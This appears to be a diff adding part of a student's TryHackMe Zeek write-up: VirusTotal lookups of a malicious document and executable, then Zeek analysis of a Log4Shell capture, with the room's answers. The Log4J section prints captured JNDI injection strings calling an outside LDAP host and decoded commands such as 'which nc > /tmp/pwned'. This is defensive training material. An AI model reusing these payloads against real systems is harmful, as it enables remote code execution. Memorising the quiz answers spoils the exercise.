@@ -156,3 +156,162 @@ then go to relations and follow link of .doc
  	Invoice&MSO-Request.doc 
 
 then again go to relations
+
+https://www.virustotal.com/gui/file/f808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb/relations
+File type
+
+VBA
+```
+*vba*
+Investigate the extracted malicious .exe file. What is the given file name in Virustotal?
+```text
+search on google knr.exe
+to get md5 hash then go to virustotal
+
+https://app.any.run/tasks/ec3cedca-0132-4b76-afba-ae74fb93fe99/
+
+now go to reports and copy hash
+
+	
+CC28E40B46237AB6D5282199EF78C464
+
+so finally in virus total search and the name is
+https://www.virustotal.com/gui/file/749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18
+
+PleaseWaitWindow.exe
+```
+*PleaseWaitWindow.exe*
+Investigate the malicious .exe file in VirusTotal. What is the contacted domain name? Enter your answer in defanged format.
+VT>Behavior>DNS Resolutions. Cyberchef can defang.
+```text
+go to behaviour > DNS Resolutions
+
+ 125.21.88.13.in-addr.arpa
+212.161.61.168.in-addr.arpa
+217.106.137.52.in-addr.arpa
+83.188.255.52.in-addr.arpa
+dunlop.hopto.org 
+
+so hopto.org ... defanging with cyberchef , because dunlop is a subdomain
+or just hopto[.]org
+```
+*hopto[.]org*
+Investigate the http.log file. What is the request name of the downloaded malicious .exe file?
+*knr.exe*
+### Log4J
+An alert triggered: "Log4J Exploitation Attempt".
+The case was assigned to you. Inspect the PCAP and retrieve the artefacts to confirm this alert is a true positive.
+Investigate the log4shell.pcapng file with detection-log4j.zeek script. Investigate the signature.log file. What is the number of signature hits?
+```text
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# ls
+clear-logs.sh  detection-log4j.zeek  log4shell.pcapng
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat detection-log4j.zeek
+```
+```text
+# Load scan-NG Package!
+@load /opt/zeek/share/zeek/site/cve-2021-44228
+
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# zeek -Cr log4shell.pcapng detection-log4j.zeek 
+
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head signatures.log 
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	signatures
+#open	2022-12-10-18-49-29
+#fields	ts	uid	src_addr	src_port	dst_addr	dst_port	note	sig_id	event_msg	sub_msg	sig_count	host_count
+
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat signatures.log | zeek-cut uid | wc -l
+3
+```
+*3*
+Investigate the http.log file. Which tool is used for scanning?
+User-agent info can help.
+
+## Enumeration
+```text
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head http.log 
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	http
+#open	2022-12-10-18-49-29
+#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
+
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat http.log | zeek-cut user_agent | sed -n "10,12p"
+${jndi:ldap://127.0.0.1:1389}
+Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+```
+*nmap*
+Investigate the http.log file. What is the extension of the exploit file?
+Uri info can help.
+```text
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head http.log 
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	http
+#open	2022-12-10-18-49-29
+#fields	ts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	trans_depth	method	host	uri	referrer	version	user_agent	origin	request_body_len	response_body_len	status_code	status_msg	info_code	info_msg	tags	username	password	proxied	orig_fuids	orig_filenames	orig_mime_types	resp_fuids	resp_filenames	resp_mime_types
+#types	time	string	addr	port	addr	port	count	string	string	string	string	string	string	string	count	count	count	string	count	string	set[enum]	string	string	set[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]	vector[string]
+1640023505.960608	C1Azru1VLUo3ZiDC33	172.17.0.1	60314	172.17.0.2	8080	1	GET	127.0.0.1:8080	/	-1.1	SecurityNik Testing	-	0	91	400	(empty)	-	-	(empty)	-	-	-	-	-	-Fq5jbu3EpCk5tV3f18	-	text/json
+1640023652.119439	CEcjx737MVaGytquj1	172.17.0.2	51832	192.168.56.102	443	1	GET	192.168.56.102:443/ExploitQ8v7ygBW4i.class	-	1.1	Java/1.8.0_181	-	0	1216	200	OK	-	-	CVE_2021_44228::LOG4J_RCE	--	-	-	-	-	Fm2Pk636DiMArmDn03	-	application/x-java-applet
+
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# cat http.log | zeek-cut uri | sort | uniq
+/
+/Exploit6HHc3BcVzI.class
+/ExploitQ8v7ygBW4i.class
+/ExploitSMMZvT8GXL.class
+/testing1
+/testing123
+testing1
+```
+*.class*
+Investigate the log4j.log file. Decode the base64 commands. What is the name of the created file?
+You can use online decoders or use Linux terminal features. "echo 'base64 data' | base64 --decode"
+```text
+root@ip-10-10-49-209:/home/ubuntu/Desktop/Exercise-Files/log4j# head log4j.log
+#separator \x09
+#set_separator	,
+#empty_field	(empty)
+#unset_field	-
+#path	log4j
+#open	2022-12-10-18-49-29
+#fields	ts	uid	http_uri	uri	stem	target_hosttarget_port	method	is_orig	name	value	matched_name	matched_value
+#types	time	string	string	string	string	string	string	string	bool	string	string	bool	bool
+1640023652.008511	CUcaDK1mHG3gFB0439	/	192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=	192.168.56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}	F	T
+1640025554.661073	C43zpa28ReOfCY0Qvd	/	192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==	192.168.56.102:389	192.168.56.102	389	GET	T	X-API-VERSION	${jndi:ldap://192.168.56.102:389/Basic/Command/Base64/d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==}	F	T
+
+d2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ echo 'd2hpY2ggbmMgPiAvdG1wL3B3bmVkCg==' | base64 -d
+which nc > /tmp/pwned
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ echo 'dG91Y2ggL3RtcC9wd25lZAo=' | base64 -d         
+touch /tmp/pwned
+```
+*pwned*
+### Conclusion
+Congratulations! You just finished the Zeek exercises.
+If you like this content, make sure you visit the following rooms later on THM;
+Snort
+Snort Challenges 1
+Snort Challenges 2
+Wireshark
+NetworkMiner
+Note that there are challenge rooms available for the discussed content. Use the search option to find them! Happy hacking!
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/644e18e84c28156e31fb2a420611bb29.png)
+
+## Notes / Lessons Learned
+[[Zeek]]
+
